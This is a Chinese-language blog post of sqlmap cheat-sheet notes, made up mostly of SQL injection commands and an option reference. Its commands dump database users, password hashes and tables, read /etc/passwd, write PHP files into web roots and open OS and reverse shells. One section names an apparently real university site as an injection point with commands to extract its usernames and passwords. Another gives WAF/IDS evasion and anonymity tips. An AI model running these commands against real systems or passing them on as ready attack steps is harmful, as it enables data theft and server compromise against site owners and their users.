---
layout: post
title: sqlmap 使用
categories: [安全工具]
description: sqlmap
keywords: 安全工具,sqlmap
---

# sqlmap 


sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches including database fingerprinting, over data fetching from the database, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.

# 下载地址

sqlmap 下载地址：

```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

# 参数介绍

[参数介绍合集](https://www.cnblogs.com/Sylon/p/11747464.html)
```
参数：--batch

用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
强制使用字符编码

-D “” #指定数据库名
–current-db #获取当前数据库名称
```

```dotnetcli
)判断当前用户是否是dba
python sqlmap.py -u "url" --is-dba -v 1
2)--users:列出数据库管理系统用户
python sqlmap.py -u "url" --users -v 0


3)--passwords:数据库用户密码(hash)
python sqlmap.py -u "url" --passwords -v 0
python sqlmap.py -u "url" --passwords -U sa -v 0


4)查看用户权限
python sqlmap.py -u "url" --privileges -v 0
python sqlmap.py -u "url" --privileges -U postgres -v 0


5)--dbs可以利用的数据库
python sqlmap.py -u "url" --dbs -v 0


6)--tables列数据库表
python sqlmap.py -u "url" --tables -D "information_scheam"


-D:指定数据名称


7)--columns 列出表中的列名
python sqlmap.py -u "url" --columns -T "user" -D "mysql" -v 1

-T:指定表名，-D:指定库名


8)--dump列表中指定列的内容
python sqlmap.py -u "url" --dump -T "users" -D "testdb"
-C:可以指定字段


指定列的范围为2到4
python sqlmap.py -u "url" --dump -T "users" -D "testdb"  --start 2 --stop 4 -v 0


9)--dumap-all列出所有数据库，所有表内容
python sqlmap.py -u "url" --dump-all -v 0


只列出用户自己新建的数据库和表的内容


python sqlmap.py -u "url" --dump-all --exclude-sysdbs -v 0


10)--file读取文件内容[load_file()函数]
python sqlmap.py -u "url" --file /etc/password


11)执行SQL
python sqlmap.py -u "url" --sql-shell


12)-p 指定参数
python sqlmap.py -u "url" -v 1 -p "id"


-p可以指定多参数-p "cat,id"


13)POST提交
python sqlmap.py -u "url" --method POST --data "id=1"


14)COOKIE提交
python sqlmap.py -u "url" --cookie "id=1" -v 1


cookie值可以由TamperData抓取


15)refer欺骗

python sqlmap.py -u "url" --refer "url" -v 3


16)使用自定义user-agent或者user-agents.txt
python sqlmap.py -u "url" --user-agent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" -v 3


python sqlmap.py -u "url" -v 1 -a "./txt/user-agents.txt"


17)使用多线程猜解
python sqlmap.py -u "url" -v 1 --current-user --threads 3


18)指定数据库，绕过SQLMAP的自动检测
python sqlmap.py -u "url" -v 2 --dbms "PostgreSQL"


19)指定操作系统绕过SQLMAP自动检测
python sqlmap.py -u "url" -v 2 --os "Windows"


20)--prefix and --postfix自定义payload
python sqlmap.py -u "url" -v 3 -p "id" --prefix "'" --postfix "and 'test'='test"


21)union注入测试
python sqlmap.py -u "url" --union-test -v -1


22)配合order by
python sqlmap.py -u "url" --union-test --union-tech orderby -v 1


23)python sqlmap.py -u "url" -v 1 --union-use --banner


24)python sqlmap.py -u "url" -v 5 --union-use --current-user


25)python sqlmap.py -u "url" -v 1 --union-use --dbs

常用语句
1.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -f -b –current-user –current-db –users –passwords –dbs -v 0
2.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –passwords -U root –union-use -v 2
3.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2
4.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –dump -C “user,pass” -v 1 –exclude-sysdbs
5.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –sql-shell -v 2
6.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –file-read “c:\boot.ini” -v 2
7.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –file-write /test/test.txt –file-dest /var/www/html/1.txt -v 2
8.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –os-cmd “id” -v 1
9.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –os-shell –union-use -v 2
10.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –os-pwn –msf-path=/opt/framework/msf3 –priv-esc -v 1
11.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –os-pwn –msf-path=/opt/framework/msf3 -v 1
12.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –os-bof –msf-path=/opt/framework/msf3 -v 1
13.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 –reg-add –reg-key=”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” –reg-value=Test –reg-type=REG_SZ –reg-data=1
14.
./sqlmap.py -u http://www.evil0x.com/ test.php?p=2 -b –eta
15.
./sqlmap.py -u “http://www.evil0x.com/ sqlmap/mysql/get_str_brackets.php?id=1″ -p id –prefix “‘)” –suffix “AND (‘abc’='abc”
16.
./sqlmap.py -u “http://www.evil0x.com/ sqlmap/mysql/basic/get_int.php?id=1″ –auth-type Basic –auth-cred “testuser:testpass”
17.

./sqlmap.py -l burp.log –scope=”(www)?\.target\.(com|net|org)”
18.
./sqlmap.py -u “http://www.evil0x.com/ sqlmap/mysql/get_int.php?id=1″ –tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
19.
./sqlmap.py -u “http://www.evil0x.com/ sqlmap/mssql/get_int.php?id=1″ –sql-query “SELECT ‘foo’” -v 1
20.
./sqlmap.py -u “http://www.evil0x.com/ mysql/get_int_4.php?id=1″ –common-tables -D testdb –banner


简单的注入流程

1.读取数据库版本，当前用户，当前数据库
sqlmap -u http://www.evil0x.com/ test.php?p=2 -f -b –current-user –current-db -v 1
2.判断当前数据库用户权限
sqlmap -u http://www.evil0x.com/ test.php?p=2 –privileges -U 用户名 -v 1
sqlmap -u http://www.evil0x.com/ test.php?p=2 –is-dba -U 用户名 -v 1
3.读取所有数据库用户或指定数据库用户的密码
sqlmap -u http://www.evil0x.com/ test.php?p=2 –users –passwords -v 2
sqlmap -u http://www.evil0x.com/ test.php?p=2 –passwords -U root -v 2
4.获取所有数据库
sqlmap -u http://www.evil0x.com/ test.php?p=2 –dbs -v 2
5.获取指定数据库中的所有表
sqlmap -u http://www.evil0x.com/ test.php?p=2 –tables -D mysql -v 2
6.获取指定数据库名中指定表的字段
sqlmap -u http://www.evil0x.com/ test.php?p=2 –columns -D mysql -T users -v 2
7.获取指定数据库名中指定表中指定字段的数据
sqlmap -u http://www.evil0x.com/ test.php?p=2 –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2
8.file-read读取web文件
sqlmap -u http://www.evil0x.com/ test.php?p=2 –file-read “/etc/passwd” -v 2
9.file-write写入文件到web
sqlmap -u http://www.evil0x.com/ test.php?p=2 –file-write /localhost/mm.php –file-dest

./sqlmap.py -u "http://www.nxadmin.com/sql-injection.php?id=1" –file-write /test/test.txt –file-dest /var/www/html/1.txt
将本地的test.txt写入到站点服务器的html目录下。


python sqlmap/sqlmap.py -help


Options（选项）： 

--version 显示程序的版本号并退出 


-h, --help 显示此帮助消息并退出 


-v VERBOSE 详细级别：0-6（默认为1） 


   


Target（目标）： 


以下至少需要设置其中一个选项，设置目标URL。 

-d DIRECT 直接连接到数据库。 


-u URL, --url=URL 目标URL。 


-l LIST 从Burp或WebScarab代理的日志中解析目标。 


-r REQUESTFILE 从一个文件中载入HTTP请求。 


-g GOOGLEDORK 处理Google dork的结果作为目标URL。 


-c CONFIGFILE 从INI配置文件中加载选项。 


   


Request（请求）： 


这些选项可以用来指定如何连接到目标URL。 


--data=DATA 通过POST发送的数据字符串 


--cookie=COOKIE HTTP Cookie头 


--cookie-urlencode URL 编码生成的cookie注入 


--drop-set-cookie 忽略响应的Set - Cookie头信息 


--user-agent=AGENT 指定 HTTP User - Agent头 


--random-agent 使用随机选定的HTTP User - Agent头 


--referer=REFERER 指定 HTTP Referer头 


--headers=HEADERS 换行分开，加入其他的HTTP头 


--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM) 


--auth-cred=ACRED HTTP身份验证凭据（用户名:密码） 


--auth-cert=ACERT HTTP认证证书（key_file，cert_file） 


--proxy=PROXY 使用HTTP代理连接到目标URL 


--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码） 


--ignore-proxy 忽略系统默认的HTTP代理 


--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒 


--timeout=TIMEOUT 等待连接超时的时间（默认为30秒） 


--retries=RETRIES 连接超时后重新连接的时间（默认3） 


--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式 

--safe-url=SAFURL 在测试过程中经常访问的url地址 


--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL 


   


Optimization（优化）： 


这些选项可用于优化SqlMap的性能。 


   


-o 开启所有优化开关 


--predict-output 预测常见的查询输出 


--keep-alive 使用持久的HTTP（S）连接 


--null-connection 从没有实际的HTTP响应体中检索页面长度 


--threads=THREADS 最大的HTTP（S）请求并发量（默认为1） 


   


Injection（注入）： 


这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 


   


-p TESTPARAMETER 可测试的参数（S） 


--dbms=DBMS 强制后端的DBMS为此值 


--os=OS 强制后端的DBMS操作系统为这个值 


--prefix=PREFIX 注入payload字符串前缀 


--suffix=SUFFIX 注入payload字符串后缀 


--tamper=TAMPER 使用给定的脚本（S）篡改注入数据 


   


Detection（检测）： 


这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 


   


--level=LEVEL 执行测试的等级（1-5，默认为1） 


--risk=RISK 执行测试的风险（0-3，默认为1） 


--string=STRING 查询时有效时在页面匹配字符串 


--regexp=REGEXP 查询时有效时在页面匹配正则表达式 


--text-only 仅基于在文本内容比较网页 


   


Techniques（技巧）： 


这些选项可用于调整具体的SQL注入测试。 


   


--technique=TECH SQL注入技术测试（默认BEUST） 


--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） 


--union-cols=UCOLS 定列范围用于测试UNION查询注入 


--union-char=UCHAR 用于暴力猜解列数的字符 


   


Fingerprint（指纹）： 


-f, --fingerprint 执行检查广泛的DBMS版本指纹 


   


Enumeration（枚举）： 


这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己 


的SQL语句。 


-b, --banner 检索数据库管理系统的标识 


--current-user 检索数据库管理系统当前用户 


--current-db 检索数据库管理系统当前数据库 


--is-dba 检测DBMS当前用户是否DBA 


--users 枚举数据库管理系统用户 


--passwords 枚举数据库管理系统用户密码哈希 


--privileges 枚举数据库管理系统用户的权限 


--roles 枚举数据库管理系统用户的角色 


--dbs 枚举数据库管理系统数据库 


--tables 枚举的DBMS数据库中的表 


--columns 枚举DBMS数据库表列 

--dump 转储数据库管理系统的数据库中的表项 


--dump-all 转储所有的DBMS数据库表中的条目 


--search 搜索列（S），表（S）和/或数据库名称（S） 


-D DB 要进行枚举的数据库名 


-T TBL 要进行枚举的数据库表 


-C COL 要进行枚举的数据库列 


-U USER 用来进行枚举的数据库用户 


--exclude-sysdbs 枚举表时排除系统数据库 


--start=LIMITSTART 第一个查询输出进入检索 


--stop=LIMITSTOP 最后查询的输出进入检索 


--first=FIRSTCHAR 第一个查询输出字的字符检索 


--last=LASTCHAR 最后查询的输出字字符检索 


--sql-query=QUERY 要执行的SQL语句 


--sql-shell 提示交互式SQL的shell 


   


Brute force（蛮力）： 


这些选项可以被用来运行蛮力检查。 

--common-tables 检查存在共同表 


--common-columns 检查存在共同列 


   


User-defined function injection（用户自定义函数注入）： 


这些选项可以用来创建用户自定义函数。 


   


--udf-inject 注入用户自定义函数 


--shared-lib=SHLIB 共享库的本地路径 


   


File system access（访问文件系统）： 


这些选项可以被用来访问后端数据库管理系统的底层文件系统。 


   


--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 


--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 


--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 


   


Operating system access（操作系统访问）： 


这些选项可以用于访问后端数据库管理系统的底层操作系统。 


--os-cmd=OSCMD 执行操作系统命令 


--os-shell 交互式的操作系统的shell 


--os-pwn 获取一个OOB shell，meterpreter或VNC 


--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC 


--os-bof 存储过程缓冲区溢出利用 


--priv-esc 数据库进程用户权限提升 


--msf-path=MSFPATH Metasploit Framework本地的安装路径 


--tmp-path=TMPPATH 远程临时文件目录的绝对路径 


   


Windows注册表访问： 


这些选项可以被用来访问后端数据库管理系统Windows注册表。 


   


--reg-read 读一个Windows注册表项值 


--reg-add 写一个Windows注册表项值数据 


--reg-del 删除Windows注册表键值 


--reg-key=REGKEY Windows注册表键 


--reg-value=REGVAL Windows注册表项值 


--reg-data=REGDATA Windows注册表键值数据 


--reg-type=REGTYPE Windows注册表项值类型 


General（一般）： 


   


这些选项可以用来设置一些一般的工作参数。 


-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中 


-s SESSIONFILE 保存和恢复检索会话文件的所有数据 


--flush-session 刷新当前目标的会话文件 


--fresh-queries 忽略在会话文件中存储的查询结果 


--eta 显示每个输出的预计到达时间 


--update 更新SqlMap 


--save file保存选项到INI配置文件 


--batch 从不询问用户输入，使用所有默认配置。 


   


Miscellaneous（杂项）： 


--beep 发现SQL注入时提醒 


--check-payload IDS对注入payloads的检测测试 


--cleanup SqlMap具体的UDF和表清理DBMS 


--forms 对目标URL的解析和测试形式 


--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果 


--page-rank Google dork结果显示网页排名（PR） 

--parse-errors 从响应页面解析数据库管理系统的错误消息 


--replicate 复制转储的数据到一个sqlite3数据库 


--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址 


--wizard 给初级用户的简单向导界面 

注入点：http://testasp.vulnweb.com/Login.asp
几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass 
 sqlmap -u http://testasp.vulnweb.com/Login.asp --forms
 sqlmap.py -u http://testasp.vulnweb.com/Login.asp --data "tfUName=1&tfUPass=1"


注入点：http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7


获取所有数据库名称
sqlmap.py -u http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7 --dbs


获取当前数据库名称
sqlmap.py -u http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7 --current-db


获取当前用户名称
sqlmap.py -u http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7 --current-user


获取全部表段


sqlmap.py -u http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7 --tables -D 数据库名称


获取全部字段
sqlmap.py -u http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7 --columns -T 表段 -D 数据库名称


获取字段内容
sqlmap.py -u http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7 --dump -C username,password  -T 表段 -D 数据库名称


1)判断当前用户是否是dba
sqlmap.py -u 网址 --is-dba -v 1
2)--users:列出数据库管理系统用户
sqlmap.py -u 网址 --users -v 0


3)--passwords:数据库用户密码(hash)
sqlmap.py -u 网址 --passwords -v 0
sqlmap.py -u 网址 --passwords -U sa -v 0


4)查看用户权限
sqlmap.py -u 网址 --privileges -v 0
sqlmap.py -u 网址 --privileges -U postgres -v 0


5)--dbs可以利用的数据库
sqlmap.py -u 网址 --dbs -v 0


6)--tables列数据库表
sqlmap.py -u 网址 --tables -D "information_scheam"


-D:指定数据名称


7)--columns 列出表中的列名
sqlmap.py -u 网址 --columns -T "user" -D "mysql" -v 1


-T:指定表名，-D:指定库名


8)--dump列表中指定列的内容
sqlmap.py -u 网址 --dump -T "users" -D "testdb"
-C:可以指定字段


指定列的范围为2到4
sqlmap.py -u 网址 --dump -T "users" -D "testdb"  --start 2 --stop 4 -v 0


9)--dumap-all列出所有数据库，所有表内容
sqlmap.py -u 网址 --dump-all -v 0


sqlmap注入技巧-绕过WAF和IDS


刚刚群里有个哥们发了个注入点，有IDS防火墙，请求过于频繁就会封杀IP
有个思路，抛砖引玉，各位大牛请轻拍
sqlmap.py --proxy http://127.0.0.1:8087 -u 你懂得 -v 3 –dbms “MySQL” --tamper “space2morehash.py” --referer“http://www.google.com”  --user-agent "Googlebot/2.1 (+http://www.googlebot.com/bot.html）"
参数解释 ：
--proxy //这个是代理的IP，你不用代理不用VPN就不怕被查水表么。。。
-u  //这个不懂的面壁去
-v 3 //这个是注入的详细级别1-5
--dbms "MySQL"  //指定数据库
--tamper “space2morehash.py”  //载入绕过WAF防火墙的脚本
--referer“http://www.google.com”  //模拟来源，就是从哪个网页跳转过来的。如果不懂可以谷歌referer
--user-agent "Googlebot/2.1 (+http://www.googlebot.com/bot.html）"   模拟谷歌蜘蛛，一般都不会限制蜘蛛爬网站。


更多命令运用：
http://wenku.baidu.com/link?url=eMzrblqUDfXDaosGNkAKnthsT4AA79BEgd5XUnD624yqefBbHaqZk-lVx3pns2M6tApuP7bbNYpPTHGBgiCxdutlUKFGtdmJj80usI2nBuS


sqlmap注入方式普及


0.详细参数详解：http://pan.baidu.com/share/link?shareid=503193&uk=3223979763
1. 基础用法：
./sqlmap.py -u “注入地址” -v 1 --dbs   // 列举数据库
./sqlmap.py -u “注入地址” -v 1 --current-db   // 当前数据库
./sqlmap.py -u “注入地址” -v 1 --users    // 列数据库用户
./sqlmap.py -u “注入地址” -v 1 --current-user  // 当前用户
./sqlmap.py -u “注入地址” -v 1 --tables -D “数据库”   // 列举数据库的表名
./sqlmap.py -u “注入地址” -v 1 --columns -T “表名” -D “数据库”   // 获取表的列名
./sqlmap.py -u “注入地址” -v 1 --dump -C “字段,字段” -T “表名” -D “数据库”   // 获取表中的数据，包含列
已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中、、、
2. sqlmap post注入
我们在使用Sqlmap进行post型注入时，
经常会出现请求遗漏导致注入失败的情况。
这里分享一个小技巧，即结合burpsuite来使用sqlmap，
用这种方法进行post注入测试会更准确，操作起来也非常容易。
1. 浏览器打开目标地址http:// www.2cto.com /Login.asp
2. 配置burp代理(127.0.0.1:8080)以拦截请求
3. 点击login表单的submit按钮
4. 如下图，这时候Burp会拦截到了我们的登录POST请求
5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下


6. 运行sqlmap并使用如下命令：
./sqlmap.py -r search-test.txt -p tfUPass
这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，
而-p 大家应该比较熟悉，指定注入用的参数。
3，sqlmap  cookies注入
sqlmap.py -u "http://127.0.0.1/base.php" --cookies "id=1"  --dbs --level 2
2.默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用--level 参数且数值>=2的时候也会检查cookie时面的参数，当>=3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础上面加上 --level 2 即可
利用sqlmap cookies注入突破用户登录继续注入
先把用户登陆的cookie拿到吧，
在收藏夹添加一个链接cookies属性：
名字自己取
javascript:alert(document.cookie)，，需要获取当前cookie的时候，
直接点一下这个链接，然后复制一下弹出对话框
里的cookie值就搞定了
sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid --dbms mssql --cookie="info=username=test"
-p是指指定参数注入
4. sqlmap遇到url重写的注入
哪里存在注入就加上 * 号
1
./sqlmap.py -u "http://www.cunlide.com/id1/1*/id2/2"
5.sqlmap 编码绕waf注入
./sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper "space2morehash.py"
在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载


sqlmap读文件
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--file-read “/etc/passwd"
sqlmap写文件
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--file-write /localhost/mm.php --file-dest/var/www/html/xx.php -v 2


sqlmap分段脱裤
sqlmap.py -u url -D "data"  -T "tables" -C "username,password,email" --dump --threads=5 --start=1 --stop=5000
其他基础：
sqlmap -u "http://url/news?id=1" --level=3 --smart --dbms "Mysql" --current-user #获取当前用户名称
sqlmap -u "http://www.xxoo.com/news?id=1" --level=3 --smart --dbms "Mysql" --current-db  #获取当前数据库名称
sqlmap -u "http://www.xxoo.com/news?id=1" --level=3 --smart --dbms "Mysql"--tables  -D "db_name" #列表名
sqlmap -u "http://url/news?id=1" --level=3 --smart  --dbms "Mysql" --columns -T "tablename" users-D "db_name" -v 0 #列字段
sqlmap -u "http://url/news?id=1" --level=3 --smart --dbms "Mysql"  --dump  -C "column_name"  -T "table_name" -D "db_name" -v 0   #获取字段内容


******************信息获取******************
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --users  #列数据库用户
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --dbs#列数据库
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--passwords #数据库用户密码
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--passwords-U root  -v 0 #列出指定用户数据库密码
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --dump-all -v 0 #列出所有数据库所有表 
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--privileges #查看权限
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--privileges -U root #查看指定用户权限
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --is-dba -v 1 #是否是数据库管理员
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --roles #枚举数据库用户角色
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--udf-inject #导入用户自定义函数（获取系统权限！）
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--dump-all --exclude-sysdbs -v 0 #列出当前库所有表
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --union-check #是否支持union 注入
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--union-cols #union 查询表记录
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --union-test #union 语句测试
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --union-use --banner #采用union 注入
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--union-test --union-tech orderby #union 配合 order by
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--method "POST" -- data "id=1&cat=2" #post注入
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--cookie "COOKIE_VALUE" #cookie注入
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"-b #获取banner信息
sqlmap -u "http://url/news?id=1" --level=3 --smart-v 1 -f #指纹判别数据库类型
sqlmap -u "http://url/news?id=1" --level=3 --smart--proxy"http://127.0.0.1:8118" #代理注入
sqlmap -u "http://url/news?id=1"--string"STRING_ON_TRUE_PAGE"  #指定关键词
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--sql-shell #执行指定sql命令


sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--os-cmd=whoami #执行系统命令
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--os-shell #系统交互shell
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--os-pwn #反弹shell
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql"--reg-read #读取win系统注册表
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --dbs-o "sqlmap.log" #保存进度
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "Mysql" --dbs  -o "sqlmap.log" --resume  #恢复已保存进度


./sqlmap.py -u “http://www.91ri.org/ id1/1*/id2/2″
"Show.asp" --cookie "id=9" --table --level 2
--forms
--data "data"
--delay 0.5
--safe-freq  25
-v 3 --dbs  --batch --tamper "base64encode.py"
sqlmap.py -u url -D "data"  -T "tables" -C "username,password,email" --dump-all -v 

 

```


##

```
sqlmap -u "http://www.xx.com/username/admin*"       #如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入
```

## 深入了解 SQLMAP API

SQLMAP API 命令和二次开发

https://www.freebuf.com/articles/web/204875.html

